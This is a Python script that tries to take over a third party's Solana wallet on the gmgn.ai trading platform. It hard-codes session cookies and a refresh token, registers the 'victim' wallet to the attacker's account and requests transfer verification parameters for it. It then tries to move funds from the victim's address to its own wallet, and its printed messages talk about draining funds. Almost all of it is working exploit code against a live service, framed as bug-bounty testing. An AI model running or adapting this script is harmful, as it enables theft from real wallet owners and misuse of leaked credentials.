#!/usr/bin/env python3
"""
CRITICAL TEST: Can we generate transfer MFA for victim wallet?

We know:
1. generate_mfa_params {usage: transfer} → NO verification needed
2. register_wallet(victim) → Links victim to our user_id

Question: Does generate_mfa_params validate from_address ownership?
"""
import json
import requests

COOKIES = {
    '_ga_UGLVBMV4Z0': 'GS1.2.1784147274019075.6b09445dc224ac4ed190f0fc17562c09.%2BWBECXoGBNBcg0Fo8XQ6Zw%3D%3D.MgwbCP7e6%2F%2Fgxg46Zi4hxw%3D%3D.NPARXjz5FNHX6j%2BVfQ4NyQ%3D%3D.lf0gy6vV0UZfM%2Buod%2FYChA%3D%3D',
    '__cf_bm': 'BiwqYrKdqGkcrH0ZLK9f_OKFba2OCsbJ28phLs8iDi0-1784147278.2017257-1.0.1.1-nFEvU2MgsYGgu6HECjXk37MIl.qPDHnGC9TNy4X5mLQ_hqdjAngW69Qng5QVjwhaQkvk8bzJQDDqab54zo2xpYk0LzVwc4rsuc8AaEkVbHhs1LgUDKxdYJRDqJicqnnR',
    'g_state': '{"i_l":1,"i_ll":1784064572835,"i_e":{"enable_itp_optimization":24},"i_et":1784064572835,"i_b":"ZKMAELdKKMvOaL6Er88DW7w1hSd2zpaA4oygW8X+Lo4"}',
    '_ga_0XM0LYXGC8': 'GS2.1.s1784146779$o42$g1$t1784147281$j50$l0$h0',
    '_ga': 'GA1.1.1499118900.1783283677',
    '_csrf': 'L6Giyxap0kezMoy_ZZVuEuos0BMQCWu2',
    '_did': 'c800ab0b7d01aa37bc93aacdcbce271e',
    '_wt': 'AWpf5OQ6yKhuZEDm40uECgKO0pTyVxTLhc8Ds-Q',
    'sid': 'gmgn%7Ca04bda1a723a8218b4953962ef8e9169'
}

REFRESH_TOKEN = "eyJhbGciOiJFUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJnbWduLmFpL3JlZnJlc2giLCJkYXRhIjp7InVzZXJfaWQiOiIwMGRhZTg3MC04NDkwLTRkMTktYmZjMC0zOWNlNDllOTA2YjUiLCJjbGllbnRfaWQiOiJnbWduX3dlYl8yMDI2MDcxNC0yMTE5LWM5MTMxNDEiLCJkZXZpY2VfaWQiOiJkZTYyMGE1Ny1kOThlLTQyOTMtYjAwNy01ZDMxNTQ1NWUyMWQiLCJmYXRoZXJfaWQiOiIiLCJmaW5nZXJwcmludCI6InYxNTMyNDdiOWUwZTE4NGZiZWQzZmFjNzNmMTlkY2E2OGEiLCJhcHAiOiJnbWduIiwicGxhdGZvcm0iOiJ3ZWIifSwiZXhwIjoxNzg2NjU2NjEyLCJpYXQiOjE3ODQwNjQ2MTIsImlzcyI6ImdtZ24uYWkvc2lnbmVyIiwianRpIjoiOTk0NzA5OTctZmQxMC00YmE2LWEyYTAtMzExODUwNTNhMTM2IiwibmJmIjoxNzg0MDY0NjEyLCJzdWIiOiJnbWduLmFpL3JlZnJlc2giLCJ1c2VyX2lkIjoiMDBkYWU4NzAtODQ5MC00ZDE5LWJmYzAtMzljZTQ5ZTkwNmI1IiwidmVyIjoiMS4wIn0.H47Vj56YK1CYK08BpclIOKLFrootpc9Aud5BYkADA4GulAD2uaSEtwA5JYUG2Pj_PQak431Fk47_Q2R9rt4CSg"

VICTIM_SOL = "DSGGcV3r7tToJMHp2XUuEK2QRJQ99G9sZxp4Ty89BZep"
OUR_USER_ID = "00dae870-8490-4d19-bfc0-39ce49e906b5"
OUR_SOL = "FzFNsCyNj8mP1pE6WzgHfwV5BJDdF3CXxN2ZmmVX7jg8"

PARAMS = {
    "device_id": "de620a57-d98e-4293-b007-5d315455e21d",
    "fp_did": "5154d56b50e3061629dca8bf8538b346",
    "client_id": "gmgn_web_20260714-2119-c913141",
    "from_app": "gmgn",
    "app_ver": "20260714-2119-c913141"
}

print("="*80)
print("🔥 CRITICAL TEST: TRANSFER MFA FOR VICTIM WALLET")
print("="*80)
print(f"Victim wallet: {VICTIM_SOL}")
print(f"Our wallet: {OUR_SOL}")
print("="*80)

# Refresh token
r = requests.post(
    "https://gmgn.ai/account/account/refresh_access_token",
    params=PARAMS,
    headers={
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    },
    cookies=COOKIES,
    json={"refresh_token": REFRESH_TOKEN},
    timeout=10
)

if r.status_code != 200 or r.json().get('code') != 0:
    print(f"Token refresh failed")
    exit(1)

ACCESS_TOKEN = r.json()['data']['data']['token']
print(f"✅ Token refreshed\n")

HEADERS = {
    "Authorization": f"Bearer {ACCESS_TOKEN}",
    "Content-Type": "application/json",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Accept": "application/json",
    "Origin": "https://gmgn.ai",
    "Referer": "https://gmgn.ai/",
}

# Step 1: Register victim wallet
print("[STEP 1] Register victim wallet to our account")
r = requests.post(
    "https://gmgn.ai/defi/quotation/v1/register_wallet",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "chain": "sol",
        "address": VICTIM_SOL,
        "user_id": OUR_USER_ID
    },
    timeout=10
)
print(f"Status: {r.status_code} | {r.json().get('msg', r.json().get('message'))}\n")

# Step 2: Try to generate transfer MFA for VICTIM wallet
print("="*80)
print("[STEP 2] Generate transfer MFA with VICTIM as from_address")
print("="*80)
print("This is THE test — does it validate ownership of from_address?")

r = requests.post(
    "https://gmgn.ai/wallet-api/v1/generate_mfa_params",
    headers=HEADERS,
    cookies=COOKIES,
    params=PARAMS,
    json={
        "usage": "transfer",
        "biz_params": {
            "transfer_id": "999",
            "transfer_type": "999",
            "chain": "sol",
            "from_address": VICTIM_SOL,  # <-- VICTIM WALLET
            "to_address": OUR_SOL,       # <-- OUR WALLET
            "amount": "1000000",
            "amount_txt": "0.001",
            "token_address": "So11111111111111111111111111111111111111112",
            "symbol": "SOL"
        }
    },
    timeout=10
)

print(f"POST /wallet-api/v1/generate_mfa_params")
print(f"Status: {r.status_code}")
resp = r.json()
print(f"\nResponse:")
print(json.dumps(resp, indent=2))

if resp.get('code') == 0:
    txn_id = resp.get('data', {}).get('txn_id')
    verify_items = resp.get('data', {}).get('verify_items', [])
    
    print("\n" + "="*80)
    print("💀💀💀💀💀 HOLY FUCK — WE GOT TXN_ID FOR VICTIM WALLET!")
    print("="*80)
    print(f"txn_id: {txn_id}")
    print(f"verify_items: {verify_items}")
    print("\nThis means we can now call /wallet-api/v1/transfer!")
    
    # Step 3: Try the actual transfer
    print("\n" + "="*80)
    print("[STEP 3] Execute transfer with victim's txn_id")
    print("="*80)
    
    r = requests.post(
        "https://gmgn.ai/wallet-api/v1/transfer",
        headers=HEADERS,
        cookies=COOKIES,
        params=PARAMS,
        json={
            "txn_id": txn_id,
            "transfer_id": "999",
            "transfer_type": "999",
            "chain": "sol",
            "from_address": VICTIM_SOL,
            "to_address": OUR_SOL,
            "amount": "1000000",
            "amount_txt": "0.001",
            "token_address": "So11111111111111111111111111111111111111112",
            "symbol": "SOL"
        },
        timeout=10
    )
    
    print(f"POST /wallet-api/v1/transfer")
    print(f"Status: {r.status_code}")
    transfer_resp = r.json()
    print(f"\nResponse:")
    print(json.dumps(transfer_resp, indent=2))
    
    if transfer_resp.get('code') == 0:
        print("\n💀💀💀💀💀💀💀 FUNDS TRANSFERRED!")
        print("CRITICAL IDOR CONFIRMED — FULL WALLET TAKEOVER")
        print("$75,000+ BUG BOUNTY")
    elif transfer_resp.get('code') == 40000320:
        print("\n💀💀💀 Transfer failed: Insufficient balance")
        print("But the endpoint accepted the txn_id!")
        print("If victim had funds, we'd drain them")
        print("This is CRITICAL — $75,000+")
    elif 'not self' in transfer_resp.get('message', '').lower():
        print("\n❌ Transfer blocked: ownership validation")
    else:
        print(f"\n⚠️  Transfer error: {transfer_resp.get('message')}")

elif 'not self' in resp.get('message', '').lower():
    print("\n❌ BLOCKED: from_address ownership validated")
    print("generate_mfa_params checks wallet ownership")
elif 'not found' in resp.get('message', '').lower():
    print("\n❌ BLOCKED: wallet not in MPC system")
else:
    print(f"\n⚠️  Error: {resp.get('message')}")

print("\n" + "="*80)
print("FINAL VERDICT")
print("="*80)
print("Testing if register_wallet + generate_mfa_params = wallet takeover")
